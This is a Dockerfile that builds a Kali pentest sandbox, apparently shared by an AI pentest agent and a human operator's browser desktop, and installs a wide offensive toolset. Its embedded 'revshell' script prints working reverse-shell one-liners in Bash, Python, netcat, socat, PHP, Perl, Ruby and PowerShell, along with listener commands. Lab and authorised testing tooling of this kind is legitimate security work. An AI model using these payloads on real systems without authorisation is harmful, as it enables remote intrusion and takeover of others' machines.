# ── Sandbox — unified pentest + desktop environment ──────────────────────────
# The ONE Kali environment both the agent's exec path (sandbox.Bridge /
# sandboxmcp.Client, docker exec) and the browser-reachable graphical desktop
# (/ws/desktop → noVNC → this container's own websockify+TigerVNC) run
# against. There used to be two separate images/containers here (a headless
# one for the agent, a bigger opt-in one for the GUI) — unified into a single
# environment so there is zero tool/environment drift between what the agent
# can reach and what the operator sees when they open the Desktop tab: same
# filesystem, same installed tools, same running process tree. The operator
# can always drop into it via the Bash tab (tmux) or the Desktop tab (XFCE) —
# neither is a different box. See
# docs/superpowers/specs/2026-09-01-browser-linux-pwnbox-design.md.
#
# Trade-off accepted knowingly: this container is NOT read-only (XFCE/VNC/
# dbus need scattered writable session state) and always runs the desktop
# stack, not just on request. The network trust boundary is unaffected either
# way — this container's default route still goes through gateway, same as
# before.

FROM golang:1.26.6-bookworm AS mcpbuilder
WORKDIR /build
COPY sandbox-mcp/go.mod sandbox-mcp/go.sum ./
RUN go mod download
COPY sandbox-mcp/*.go ./
RUN CGO_ENABLED=0 go build -trimpath -o /out/yummi-sandbox-mcp .

# ── recontools stage: modern bug-bounty recon binaries not in Kali apt ───────
# ProjectDiscovery's httpx/dnsx/alterx and lc/gau give the senior recon
# methodology (persona/v0.1/skills/osint-enum.yaml) its live-probing,
# resolution, permutation, and historical-URL steps — the pieces subfinder/
# amass/theHarvester alone don't cover. Installed here and copied as static
# binaries so the runtime image needs no Go toolchain. @latest is intentional
# and consistent with this image's design: the base is kali-rolling:latest and
# subfinder/nuclei come from rolling apt, so the sandbox is deliberately a
# rolling/latest environment, not a pinned one.
FROM golang:1.26.6-bookworm AS recontools
ENV CGO_ENABLED=0 GOBIN=/out
RUN go install github.com/projectdiscovery/httpx/cmd/httpx@latest
RUN go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
RUN go install github.com/projectdiscovery/alterx/cmd/alterx@latest
RUN go install github.com/projectdiscovery/katana/cmd/katana@latest
RUN go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
RUN go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest
RUN go install github.com/PentestPad/subzy@latest
# jsluice pulls in go-tree-sitter, whose per-language bindings are cgo —
# the stage's own CGO_ENABLED=0 default excludes them entirely ("build
# constraints exclude all Go files"), so this one install needs cgo back
# on. The golang:*-bookworm builder image ships gcc for exactly this.
RUN CGO_ENABLED=1 go install github.com/BishopFox/jsluice/cmd/jsluice@latest
RUN go install github.com/hahwul/dalfox/v2@latest
RUN go install github.com/lc/gau/v2/cmd/gau@latest
RUN go install github.com/jpillora/chisel@latest
RUN go install github.com/ropnop/kerbrute@latest

FROM kalilinux/kali-rolling:latest

LABEL org.opencontainers.image.title="Yummi sandbox"
LABEL org.opencontainers.image.description="Unified Kali pentest + desktop container — agent exec and browser-reached XFCE desktop share this one environment, network traffic gated by gateway"
LABEL org.opencontainers.image.licenses="Apache-2.0"
LABEL org.opencontainers.image.source="https://github.com/n0connect/yummi"

ENV DEBIAN_FRONTEND=noninteractive

# Pentest tool set plus the desktop stack: xfce4 (window manager + panel +
# session), a terminal and file manager, tigervnc (the VNC server), novnc +
# websockify (browser-reachable VNC over a WebSocket), dbus-x11 (XFCE needs a
# session bus), and firefox-esr for in-browser recon/testing work from
# inside the sandbox itself.
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
      7zip \
      amass \
      arjun \
      bat \
      bind9-host \
      binutils \
      binwalk \
      bloodhound.py \
      bsdextrautils \
      burpsuite \
      bzip2 \
      ca-certificates \
      certipy-ad \
      cewl \
      checksec \
      chromium \
      coercer \
      commix \
      crunch \
      curl \
      dbus-x11 \
      dirb \
      dirsearch \
      dnsenum \
      dnsrecon \
      dnsutils \
      dos2unix \
      enum4linux \
      evil-winrm \
      exploitdb \
      fd-find \
      feroxbuster \
      ffuf \
      file \
      firefox-esr \
      fping \
      fzf \
      gdb \
      git \
      gitleaks \
      gobuster \
      hashcat \
      hping3 \
      hydra \
      imagemagick \
      impacket-scripts \
      ipcalc \
      iproute2 \
      iptables \
      iputils-ping \
      jq \
      john \
      less \
      libcap2-bin \
      ligolo-ng \
      ltrace \
      masscan \
      medusa \
      metasploit-framework \
      mimikatz \
      mtr-tiny \
      nano \
      nbtscan \
      net-tools \
      netcat-openbsd \
      netexec \
      nftables \
      nikto \
      nishang \
      nmap \
      novnc \
      nuclei \
      onesixtyone \
      openssh-client \
      patchelf \
      peass \
      penelope \
      powersploit \
      procps \
      proxychains4 \
      python3-pwntools \
      python3-scapy \
      radare2 \
      responder \
      ripgrep \
      rlwrap \
      rsync \
      seclists \
      smbclient \
      smbmap \
      snmp \
      socat \
      sqlmap \
      sshpass \
      sslscan \
      strace \
      subfinder \
      tcpdump \
      telnet \
      testssl.sh \
      theharvester \
      thunar \
      tigervnc-common \
      tigervnc-standalone-server \
      tmux \
      traceroute \
      tree \
      tshark \
      unzip \
      vim-tiny \
      wafw00f \
      webshells \
      websockify \
      wfuzz \
      wget \
      whatweb \
      whois \
      wireshark \
      wordlists \
      wpscan \
      x11-xserver-utils \
      xfce4 \
      xfce4-terminal \
      xz-utils \
      # Lab VPN connectivity: HackTheBox, TryHackMe, Proving Grounds, and client
      # lab engagements all deliver a .ovpn file — openvpn consumes it directly.
      # Operator or agent runs `openvpn --config lab.ovpn` in a tmux term_run
      # call (wait=false); tun0 then appears as the reachable tunnel interface.
      openvpn \
      # Native Kerberos ticket management for AD engagements (Pass-the-Ticket,
      # PKINIT, Kerberoasting/AS-REP Roasting, certipy, impacket, netexec).
      # kinit/klist/kdestroy from this package let the agent acquire and inspect
      # TGTs without shimming through Python wrappers.
      krb5-user && \
      if [ -f /usr/lib/nmap/nmap ]; then setcap cap_net_admin,cap_net_raw=eip /usr/lib/nmap/nmap; fi && \
      if [ -f /usr/bin/masscan ]; then setcap cap_net_admin,cap_net_raw=eip /usr/bin/masscan; fi && \
      if [ -f /usr/bin/ping ]; then setcap cap_net_raw=eip /usr/bin/ping && chmod 4755 /usr/bin/ping; fi && \
      if [ -f /usr/sbin/hping3 ]; then setcap cap_net_admin,cap_net_raw=eip /usr/sbin/hping3; fi && \
      if [ -f /usr/bin/fping ]; then setcap cap_net_raw=eip /usr/bin/fping && chmod 4755 /usr/bin/fping; fi && \
      if [ -f /usr/bin/dumpcap ]; then setcap cap_net_admin,cap_net_raw=eip /usr/bin/dumpcap && chmod 4755 /usr/bin/dumpcap; fi && \
      if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then gzip -d -k /usr/share/wordlists/rockyou.txt.gz; fi && \
      (command -v testssl.sh >/dev/null && ln -sf "$(command -v testssl.sh)" /usr/local/bin/testssl || true) && \
      (command -v hping3 >/dev/null && [ ! -f /usr/local/bin/hping3 ] && ln -sf "$(command -v hping3)" /usr/local/bin/hping3 || true) && \
      (command -v responder >/dev/null && [ ! -f /usr/local/bin/responder ] && ln -sf "$(command -v responder)" /usr/local/bin/responder || true) && \
      (command -v john >/dev/null && [ ! -f /usr/local/bin/john ] && ln -sf "$(command -v john)" /usr/local/bin/john || true) && \
      (command -v 7zz >/dev/null && [ ! -f /usr/local/bin/7z ] && ln -sf "$(command -v 7zz)" /usr/local/bin/7z || true) && \
      (command -v batcat >/dev/null && [ ! -f /usr/local/bin/bat ] && ln -sf "$(command -v batcat)" /usr/local/bin/bat || true) && \
      (command -v fdfind >/dev/null && [ ! -f /usr/local/bin/fd ] && ln -sf "$(command -v fdfind)" /usr/local/bin/fd || true) && \
      (command -v /usr/share/peass/linpeas/linpeas.sh >/dev/null && ln -sf /usr/share/peass/linpeas/linpeas.sh /usr/local/bin/linpeas && ln -sf /usr/share/peass/linpeas/linpeas.sh /usr/local/bin/linpeas.sh || true) && \
      for tool in nmap curl ffuf gobuster nikto whatweb grep rg git tmux Xtigervnc websockify xfce4-session convert r2 radare2 gdb checksec binwalk strace ltrace file strings objdump readelf dig chromium feroxbuster commix masscan whois sslscan dnsrecon gitleaks ping hping3 fping searchsploit smbmap john hashcat wfuzz cewl ps less nano 7z unzip tree rsync dirsearch evil-winrm certipy coercer bat fzf traceroute mtr nxc netexec rlwrap penelope openvpn kinit msfconsole msfvenom; do command -v "$tool" >/dev/null || { echo "tool missing: $tool" >&2; exit 1; }; done && \
      rm -rf /var/lib/apt/lists/*

# GitHub-sourced Python pentest tools with no Kali apt package: jwt_tool,
# cloud_enum, graphql-cop, corsy. Each is referenced by name in
# sandbox-mcp/tools_extended.go's jwt_tool_inspect/cloud_enum_scan/
# graphql_cop_scan/corsy_scan handlers (plain exec.Command("jwt_tool", ...)
# style calls) — a bare `apt-get install jwt-tool` was tried here and fails
# outright (no such package; jwt_tool is a GitHub-only Python script, never
# packaged for Debian/Kali), and cloud_enum/graphql-cop/corsy were never
# provisioned at all, so all four would fail at runtime with "command not
# found" even once the image built. Cloned to /opt, deps pip-installed with
# --break-system-packages (Kali's system Python is PEP 668-managed; nothing
# else in this image runs Python that could conflict), then wrapped as a
# thin argv-forwarding script on PATH under each tool's own exec name.
RUN apt-get update && apt-get install -y --no-install-recommends python3-pip && \
    rm -rf /var/lib/apt/lists/* && \
    git clone --depth 1 https://github.com/ticarpi/jwt_tool.git /opt/jwt_tool && \
    git clone --depth 1 https://github.com/initstring/cloud_enum.git /opt/cloud_enum && \
    git clone --depth 1 https://github.com/dolevf/graphql-cop.git /opt/graphql-cop && \
    git clone --depth 1 https://github.com/s0md3v/Corsy.git /opt/corsy && \
    pip3 install --break-system-packages --no-cache-dir \
      termcolor cprint pycryptodomex requests ratelimit simplejson PySocks \
      dnspython requests-futures && \
    printf '#!/bin/sh\nexec python3 /opt/jwt_tool/jwt_tool.py "$@"\n' > /usr/local/bin/jwt_tool && \
    printf '#!/bin/sh\nexec python3 /opt/cloud_enum/cloud_enum.py "$@"\n' > /usr/local/bin/cloud_enum && \
    printf '#!/bin/sh\nexec python3 /opt/graphql-cop/graphql-cop.py "$@"\n' > /usr/local/bin/graphql-cop && \
    printf '#!/bin/sh\nexec python3 /opt/corsy/corsy.py "$@"\n' > /usr/local/bin/corsy && \
    chmod +x /usr/local/bin/jwt_tool /usr/local/bin/cloud_enum /usr/local/bin/graphql-cop /usr/local/bin/corsy && \
    for tool in jwt_tool cloud_enum graphql-cop corsy; do command -v "$tool" >/dev/null || { echo "git-sourced tool missing: $tool" >&2; exit 1; }; done

# PayloadsAllTheThings: curated collection of payloads and bypasses for Web, API,
# Network, and PrivEsc engagements. Cloned into /opt and symlinked into user home.
RUN git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git /opt/PayloadsAllTheThings

# revshell — lightweight reverse shell payload generator.
# Usage: revshell [PORT]  (defaults to 4444)
# IP auto-detection order: tun0 (VPN) → eth0 → any first non-loopback iface.
# Prints copy-paste payloads for Bash, Python3, Netcat, Socat, PHP, PowerShell,
# Perl, Ruby, and curl-downloaded meterpreter stager — one command, zero web lookup.
RUN cat << 'REVSHELL_EOF' > /usr/local/bin/revshell
#!/usr/bin/env bash
# revshell — Yummi reverse shell payload generator
# Usage: revshell [PORT]   (IP auto-detected from tun0/eth0/first-iface)

PORT="${1:-4444}"

# Prefer tun0 (VPN), fall back to eth0, then first non-loopback interface
get_ip() {
  local iface
  for iface in tun0 eth0; do
    ip -4 addr show "$iface" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1 | grep -q . && \
      ip -4 addr show "$iface" | awk '/inet /{print $2}' | cut -d/ -f1 | head -1 && return
  done
  ip -4 addr | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v '^127\.' | head -1
}

IP=$(get_ip)
if [ -z "$IP" ]; then
  echo "[!] Could not detect a local IP — set manually: revshell <PORT> (and edit the LHOST below)"
  IP="LHOST"
fi

BOLD='\033[1m'; CYAN='\033[0;36m'; YELLOW='\033[0;33m'; GREEN='\033[0;32m'; RESET='\033[0m'
echo -e "${BOLD}${CYAN}⚡ Yummi Reverse Shell Generator${RESET}"
echo -e "   LHOST: ${GREEN}${IP}${RESET}   LPORT: ${GREEN}${PORT}${RESET}"
echo -e "   VPN interface: $(ip link show tun0 2>/dev/null | grep -q UP && echo 'tun0 ✓' || echo 'not up')\n"

show() { echo -e "${YELLOW}[$1]${RESET}\n${2}\n"; }

show "Bash TCP" "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1"
show "Bash TCP (encoded)" "bash -c '{echo,$(echo "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1" | base64 -w0)}|{base64,-d}|bash'"
show "Python3" "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
show "Netcat (OpenBSD)" "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f"
show "Netcat (traditional)" "nc -e /bin/sh ${IP} ${PORT}"
show "Socat" "socat TCP:${IP}:${PORT} EXEC:/bin/sh"
show "Socat (TTY upgrade)" "socat TCP:${IP}:${PORT} EXEC:'/bin/bash -li',pty,stderr,sigint,sane"
show "PHP" "php -r '\$s=fsockopen(\"${IP}\",${PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
show "Perl" "perl -e 'use Socket;\$i=\"${IP}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
show "Ruby" "ruby -rsocket -e'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
show "PowerShell" "\$c=New-Object System.Net.Sockets.TCPClient('${IP}',${PORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};\$e=New-Object System.Text.ASCIIEncoding;while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=\$e.GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+\"PS \"+(pwd).Path+\"> \";\$x=\$e.GetBytes(\$sb2);\$s.Write(\$x,0,\$x.Length);\$s.Flush()};\$c.Close()"

echo -e "${BOLD}${CYAN}── Listener starters ──────────────────────────────────────${RESET}"
echo -e "  ${YELLOW}rlnc ${PORT}${RESET}               # rlwrap nc (readline history)"
echo -e "  ${YELLOW}penelope -p ${PORT}${RESET}         # penelope (auto-upgrade to PTY)"
echo -e "  ${YELLOW}socat -d -d TCP-LISTEN:${PORT},reuseaddr,fork EXEC:'/bin/bash -li',pty,stderr,sigint,sane${RESET}"
REVSHELL_EOF
RUN chmod 0755 /usr/local/bin/revshell

RUN groupadd --gid 1000 pentester && \
    useradd --uid 1000 --gid pentester --create-home --shell /bin/bash pentester && \
    # wireshark's dumpcap needs this group to capture without full root —
    # matches nmap's setcap-based (not root-based) capability grant above.
    # Best-effort: the "wireshark" group only exists if the wireshark-common
    # package's debconf prompt (non-interactive here) created it, which isn't
    # guaranteed across Kali rolling snapshots — dumpcap still works as root
    # via `sudo`-less docker exec's own privilege if this doesn't apply, so
    # this must not fail the whole image build over it.
    (usermod -aG wireshark pentester || true)

# Enhanced bash configuration with colors, multi-session history sync, pentest aliases, and fzf integration
RUN cat << 'EOF' >> /home/pentester/.bashrc

# Yummi Pentest Workbench Environment
export PS1='\[\033[01;31m\]┌──(\[\033[01;36m\]pentester㉿yummi-pwnbox\[\033[01;31m\])-[\[\033[01;37m\]\w\[\033[01;31m\]]\n\[\033[01;31m\]└─\[\033[01;36m\]\$\[\033[00m\] '

# Multi-session command history preservation & immediate sync across terminals
HISTSIZE=100000
HISTFILESIZE=100000
shopt -s histappend
PROMPT_COMMAND="history -a; history -n; ${PROMPT_COMMAND:-}"

# Yummi Pwnbox interactive greeting banner
if [ -t 1 ] && [ -z "${YUMMI_QUIET_SHELL:-}" ] && [ -z "${YUMMI_BANNER_SHOWN:-}" ]; then
  export YUMMI_BANNER_SHOWN=1
  cat << 'BANNER'
[01;36m __     __                          _   ____                  _               [00m
[01;36m \ \   / /                         (_) |  _ \                | |              [00m
[01;36m  \ \_/ /   _ _ __ ___  _ __ ___    _  | |_) |_      ___ __ | |__   _____  __[00m
[01;36m   \   / | | | '_ ` _ \| '_ ` _ \  | | |  _ <\ \ /\ / / '_ \| '_ \ / _ \ \/ /[00m
[01;36m    | |  | |_| | | | | | | | | | | | | | |_) |\ V  V /| | | | |_) | (_) >  < [00m
[01;36m    |_|   \__,_|_| |_| |_|_| |_| |_|_| |____/  \_/\_/ |_| |_|_.__/ \___/_/\_\[00m
[01;30m──────────────────────────────────────────────────────────────────────────────[00m
[01;32m ⚡ Yummi Pwnbox: Autonomous AI Offensive Operations & Tactical Range[00m
[01;33m [•] Shortcuts:[00m $ROCKYOU, $COMMON_TXT, $BIG_TXT, $USERNAMES, $PASSWORDS_TOP
[01;33m [•] Helpers:[00m   revshell, rlnc, penelope, serve-workspace, msf, myip, ports
[01;33m [•] VPN:[00m       openvpn --config /workspace/lab.ovpn (tun0)
[01;30m──────────────────────────────────────────────────────────────────────────────[00m
BANNER
fi

# Core aliases
alias ll='ls -la --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias grep='grep --color=auto'
alias bat='batcat'
alias fd='fdfind'

# Pentest recon & networking
alias myip='ip -br -c a'
alias ports='ss -tulpn'
alias nmap-fast='nmap -T4 -v --open'
alias linpeas='linpeas.sh'
alias msf='msfconsole -q'
alias msfconsole='msfconsole -q'

# Reverse shell & listener helpers
alias rlsocat='rlwrap socat file:`tty`,raw,echo=0'
alias pen='penelope'
alias serve='python3 -m http.server 8000'
alias serve-workspace='python3 -m http.server 8000 --directory /home/pentester/workspace'
alias serve-payloads='python3 -m http.server 8000 --directory /home/pentester/payloadsallthethings'

# Quick directory jumps
alias seclists='cd /home/pentester/seclists'
alias wordlists='cd /home/pentester/wordlists_system'
alias payloads='cd /home/pentester/payloadsallthethings'
alias privesc='cd /home/pentester/privesc_peass'
alias windows='cd /home/pentester/windows_resources'
alias nishang='cd /home/pentester/nishang'
alias workspace='cd /home/pentester/workspace'

# Wordlist shortcut variables (ROCKYOU, COMMON_TXT, ...) live in
# /etc/profile.d/yummi-pwnbox.sh, not here — see the profile COPY below.

# Fast fuzzy shell search (fzf) with Yummi styling
export FZF_DEFAULT_COMMAND='fdfind --type f --strip-cwd-prefix --hidden --follow --exclude .git 2>/dev/null || find . -type f'
export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
export FZF_ALT_C_COMMAND='fdfind --type d --strip-cwd-prefix --hidden --follow --exclude .git 2>/dev/null || find . -type d'
export FZF_DEFAULT_OPTS='--height 40% --layout=reverse --border --color=dark,bg+:#1e293b,fg+:#38bdf8,hl:#38bdf8,hl+:#38bdf8,pointer:#38bdf8,prompt:#38bdf8,info:#6b7a80'

# Enable fzf bash completion and keybindings (Ctrl+R, Ctrl+T, Alt+C)
if command -v fzf >/dev/null 2>&1; then
  eval "$(fzf --bash 2>/dev/null)" || {
    [ -f /usr/share/doc/fzf/examples/key-bindings.bash ] && . /usr/share/doc/fzf/examples/key-bindings.bash
    [ -f /usr/share/doc/fzf/examples/completion.bash ] && . /usr/share/doc/fzf/examples/completion.bash
  } 2>/dev/null || true
fi
EOF
RUN cp /home/pentester/.bashrc /etc/skel/.bashrc

# Ergonomic tmux configuration for the operator's interactive Bash tab
RUN cat << 'EOF' > /home/pentester/.tmux.conf
# Yummi Pentest Terminal Environment
set -g default-terminal "screen-256color"
set -g history-limit 50000
set -g mouse on
setw -g mode-keys vi
set -s escape-time 0
set -g base-index 1
setw -g pane-base-index 1

# Vi copy mode bindings
bind-key -T copy-mode-vi v send-keys -X begin-selection
bind-key -T copy-mode-vi y send-keys -X copy-pipe-and-cancel
bind-key -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel

# Yummi Cyan / Dark theme (#0a0c0e / #38bdf8)
set -g status-style "bg=#0a0c0e,fg=#38bdf8"
set -g status-left "#[fg=#38bdf8,bold] ⚡ YUMMI PWNBOX [#S] #[default]"
set -g status-right "#[fg=#6b7a80]%H:%M %d-%b#[default] "
set -g window-status-current-style "bg=#38bdf8,fg=#0a0c0e,bold"
set -g pane-border-style "fg=#1e293b"
set -g pane-active-border-style "fg=#38bdf8"
EOF
RUN cp /home/pentester/.tmux.conf /etc/tmux.conf && \
    chown pentester:pentester /home/pentester/.tmux.conf

# Editor ergonomics (vim & nano syntax and indentation)
RUN printf "syntax on\nset number\nset mouse=\nset tabstop=4\nset shiftwidth=4\nset expandtab\nset autoindent\n" > /home/pentester/.vimrc && \
    printf "set tabstospaces\nset tabsize 4\n" > /home/pentester/.nanorc && \
    chown pentester:pentester /home/pentester/.vimrc /home/pentester/.nanorc

# Pre-packaged desktop launchers for noVNC / XFCE
RUN mkdir -p /usr/share/yummi/desktop && \
    ( [ -f /usr/share/applications/firefox-esr.desktop ] && cp /usr/share/applications/firefox-esr.desktop /usr/share/yummi/desktop/ || cat << 'EOF' > /usr/share/yummi/desktop/firefox-esr.desktop
[Desktop Entry]
Version=1.0
Type=Application
Name=Firefox ESR
Comment=Browse the Web & Security Testing
Exec=firefox-esr %u
Icon=firefox-esr
Terminal=false
Categories=Network;WebBrowser;Security;
EOF
) && \
    ( [ -f /usr/share/applications/burpsuite.desktop ] && cp /usr/share/applications/burpsuite.desktop /usr/share/yummi/desktop/ || [ -f /usr/share/applications/kali-burpsuite.desktop ] && cp /usr/share/applications/kali-burpsuite.desktop /usr/share/yummi/desktop/burpsuite.desktop || cat << 'EOF' > /usr/share/yummi/desktop/burpsuite.desktop
[Desktop Entry]
Version=1.0
Type=Application
Name=Burp Suite
Comment=Web Application Security Testing & Proxy
Exec=burpsuite
Icon=burpsuite
Terminal=false
Categories=Network;Security;
EOF
) && \
    ( [ -f /usr/share/applications/wireshark.desktop ] && cp /usr/share/applications/wireshark.desktop /usr/share/yummi/desktop/ || [ -f /usr/share/applications/kali-wireshark.desktop ] && cp /usr/share/applications/kali-wireshark.desktop /usr/share/yummi/desktop/wireshark.desktop || cat << 'EOF' > /usr/share/yummi/desktop/wireshark.desktop
[Desktop Entry]
Version=1.0
Type=Application
Name=Wireshark
Comment=Network Traffic Analyzer
Exec=wireshark %f
Icon=wireshark
Terminal=false
Categories=Network;Security;
EOF
) && \
    ( [ -f /usr/share/applications/xfce4-terminal.desktop ] && cp /usr/share/applications/xfce4-terminal.desktop /usr/share/yummi/desktop/ || cat << 'EOF' > /usr/share/yummi/desktop/xfce4-terminal.desktop
[Desktop Entry]
Version=1.0
Type=Application
Name=Terminal
Comment=Access the command line
Exec=xfce4-terminal
Icon=utilities-terminal
Terminal=false
Categories=System;TerminalEmulator;
EOF
) && \
    ( [ -f /usr/share/applications/thunar.desktop ] && cp /usr/share/applications/thunar.desktop /usr/share/yummi/desktop/ || cat << 'EOF' > /usr/share/yummi/desktop/thunar.desktop
[Desktop Entry]
Version=1.0
Type=Application
Name=File Manager
Comment=Manage files and folders
Exec=thunar %U
Icon=org.xfce.thunar
Terminal=false
Categories=System;FileManager;
EOF
) && \
    ( [ -f /usr/share/applications/kali-msfconsole.desktop ] && cp /usr/share/applications/kali-msfconsole.desktop /usr/share/yummi/desktop/ || cat << 'EOF' > /usr/share/yummi/desktop/metasploit.desktop
[Desktop Entry]
Version=1.0
Type=Application
Name=Metasploit Console
Comment=Metasploit Penetration Testing Framework
Exec=xfce4-terminal -T "Metasploit Console" --geometry=120x35 -e "msfconsole -q"
Icon=utilities-terminal
Terminal=false
Categories=Network;Security;
EOF
) && \
    chmod +x /usr/share/yummi/desktop/*.desktop && \
    mkdir -p /home/pentester/Desktop && \
    cp -f /usr/share/yummi/desktop/*.desktop /home/pentester/Desktop/ && \
    chown -R pentester:pentester /home/pentester/Desktop

# nuclei ships with ZERO templates from Kali's apt package — without this,
# every nuclei invocation (vuln-scanning skill, api-pentest's -tags graphql)
# silently matches nothing, no error, no findings, ever. Fetched here as the
# SAME user (pentester, UID 1000) that will actually run nuclei via
# docker exec, so the template path nuclei resolves at build time is the
# exact one it resolves at runtime. This also gives subdomain-takeover
# detection "for free" — nuclei's own templates include a takeover-tagged
# category (`nuclei -tags takeover`), no separate tool needed. Templates are
# baked into the image (not fetched at container start) for a fast, fully
# offline-capable first run; they go stale between image rebuilds, which is
# the same rolling-image trade-off this Dockerfile already makes elsewhere.
RUN su - pentester -c "nuclei -update-templates -silent" 2>&1 | tail -5

# Branded wallpaper — generated at build time (no external asset fetch),
# matching the web UI's own dark theme tokens (--bg-base #0a0c0e, --cyan
# #38bdf8, --text-tertiary-ish #6b7a80 for the tagline) so the desktop
# reads as the SAME product as the browser chrome around it, not a stock
# Kali install with a browser window open to it.
RUN mkdir -p /usr/share/backgrounds/yummi && \
    convert -size 1920x1080 xc:'#0a0c0e' \
      -gravity center \
      -font DejaVu-Sans-Mono-Bold -pointsize 110 -fill '#38bdf8' \
      -annotate +0-40 'YUMMI PWNBOX' \
      -font DejaVu-Sans-Mono -pointsize 26 -fill '#6b7a80' \
      -annotate +0+70 'OFFENSIVE SECURITY OPERATIONS & AI RANGE' \
      /usr/share/backgrounds/yummi/wallpaper.png

COPY sandbox/entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod 0755 /usr/local/bin/entrypoint.sh

# Workbench env for login shells (agent `bash -lc` included) — see the file's
# header for why this is not in .bashrc. Manifest the model reads on demand.
COPY sandbox/profile-yummi.sh /etc/profile.d/yummi-pwnbox.sh
RUN sh -n /etc/profile.d/yummi-pwnbox.sh && chmod 0644 /etc/profile.d/yummi-pwnbox.sh
COPY sandbox/pwnbox.md /etc/yummi/pwnbox.md
RUN chmod 0644 /etc/yummi/pwnbox.md

# Non-interactive listener for the agent: `rlnc PORT` must be a real binary,
# because aliases do not expand under `bash -lc`.
RUN printf '#!/bin/sh\nexec rlwrap nc -lvnp "$@"\n' > /usr/local/bin/rlnc && chmod 0755 /usr/local/bin/rlnc

COPY --from=mcpbuilder /out/yummi-sandbox-mcp /usr/local/bin/yummi-sandbox-mcp
RUN chmod 0755 /usr/local/bin/yummi-sandbox-mcp

# Modern recon/web binaries (see the recontools stage) —
# httpx/dnsx/alterx/katana/dalfox/gau/naabu/tlsx/subzy/jsluice/chisel. Verify they landed and are runnable, so
# a broken install fails the build rather than surfacing as a mysterious
# "command not found" mid-engagement.
COPY --from=recontools /out/ /usr/local/bin/
RUN for tool in httpx dnsx alterx gau katana dalfox naabu tlsx subzy jsluice chisel kerbrute; do command -v "$tool" >/dev/null || { echo "recon tool missing: $tool" >&2; exit 1; }; done

# Pentest commands from orchestrator run as UID 1000 via docker exec --user;
# the operator's Bash tab attaches a tmux session as the same user. The
# entrypoint (root) sets up routing + filesystem prep, then drops to
# pentester for the desktop session.
WORKDIR /home/pentester

# 6080: websockify's WebSocket<->VNC bridge, proxied by orchestrator's
# /ws/desktop handler — never published to the host directly, same pattern
# the terminal bridge uses for docker exec.
EXPOSE 6080

HEALTHCHECK --interval=30s --timeout=10s --retries=3 --start-period=90s \
    CMD curl -sf http://127.0.0.1:6080/ > /dev/null 2>&1

ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
